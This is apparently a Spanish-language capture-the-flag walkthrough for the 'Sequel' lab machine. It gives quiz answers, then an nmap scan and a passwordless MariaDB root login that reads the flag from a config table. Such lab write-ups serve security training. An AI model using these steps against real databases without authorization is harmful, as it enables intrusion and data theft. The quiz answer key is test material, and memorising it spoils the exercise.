# Máquina Sequel

## Contenido

1. [Introducción](#introducción)
2. [Escaneo de puertos](#escaneo-de-puertos)
4. [Explotación](#explotación)

## Introducción

Cuestionario:

Durante nuestro escaneo, ¿qué puerto encontramos sirviendo MySQL?

Respuesta: 3306.

¿Qué versión de MySQL desarrollada por la comunidad está ejecutando el objetivo?

Respuesta: MariaDB.

Al usar el cliente de línea de comandos de MySQL, ¿qué interruptor necesitamos usar para especificar un nombre de usuario de inicio de sesión?

Respuesta: -u.

¿Qué nombre de usuario nos permite iniciar sesión en esta instancia de MariaDB sin proporcionar una contraseña?

Respuesta: root.

En SQL, ¿qué símbolo podemos usar para especificar dentro de la consulta que queremos mostrar todo dentro de una tabla?

Respuesta: *.

En SQL, ¿con qué símbolo necesitamos terminar cada consulta?

Respuesta: ;.

Hay tres bases de datos en esta instancia de MySQL que son comunes a todas las instancias de MySQL.  ¿Cuál es el nombre del cuarto que es exclusivo de este anfitrión?

Respuesta: htb.

## Escaneo de puertos

Para hacer un escaneo de puertos se necesita la herramienta `nmap` y se ejecuta el siguiente comando:
```bash
nmap <IP>
```

Al ejecutarlo nos damos cuenta que tiene un puerto abierto, el puerto 3306 que es el puerto de MySQL.

## Explotación

Para explotar la máquina vamos a usar el mysql client, para esto se usa el siguiente comando:

```bash
mysql -u root -h <IP>
```

Al ser un usuario root no se necesita contraseña.

Una vez dentro de la consola de MySQL se ejecuta el siguiente comando para ver las bases de datos:

```sql
show databases;
```

Nos muestra una lista de bases de datos, de las cuales solo nos interesa la base de datos `htb`. Para seleccionar la base de datos se usa el siguiente comando:

```sql
use htb;
```

Una vez seleccionada la base de datos se ejecuta el siguiente comando para ver las tablas de la base de datos:

```sql
show tables;
```

Nos muestra dos tablas:

- config
- users

Para seleccionar la tabla `config` se usa el siguiente comando:

```sql
select * from config;
```

Y nos arroja varias columnas con información, la que nos interesa es la que dice `flag`, ya que contiene la flag del reto.

Con esto podemos decir:

> Máquina Sequel **Hackeada**



